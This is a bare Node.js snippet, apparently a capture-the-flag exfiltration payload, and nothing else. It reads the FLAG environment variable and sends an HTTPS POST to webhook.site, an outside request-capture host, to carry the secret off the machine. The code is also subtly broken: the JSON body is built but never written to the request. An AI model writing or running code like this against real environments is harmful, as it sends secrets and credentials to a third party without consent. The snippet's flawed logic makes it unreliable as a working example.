const https = require('https');
const flag = process.env.FLAG;
if (flag) {
 const data = JSON.stringify({ flag: flag });
 const options = {hostname: 'webhook.site', path: '/example', method: 'POST'};
 const req = https.request(options);  req.end();
}
